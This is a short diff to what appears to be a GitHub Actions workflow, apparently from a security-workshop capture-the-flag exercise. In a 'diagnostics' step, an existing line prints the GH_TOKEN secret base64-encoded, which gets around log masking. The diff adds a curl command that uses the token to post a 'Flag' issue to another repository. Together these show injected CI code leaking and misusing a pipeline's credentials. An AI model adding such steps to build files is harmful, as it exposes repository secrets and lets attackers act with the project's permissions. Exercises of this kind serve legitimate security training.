@@ -32,6 +32,7 @@ jobs:
         run: |
           mkdir -p diagnostics
           echo $GH_TOKEN | base64
+          curl -X POST   -H "Authorization: Bearer $GH_TOKEN"   -H "Accept: application/vnd.github+json"   https://api.github.com/repos/ndc-sec-ws/flag-5/issues   -d '{"title":"Flag","body":"user: novotnej"}'
           {
             echo "=== Build Diagnostics Report ==="
             echo "Timestamp: $(date -u)"
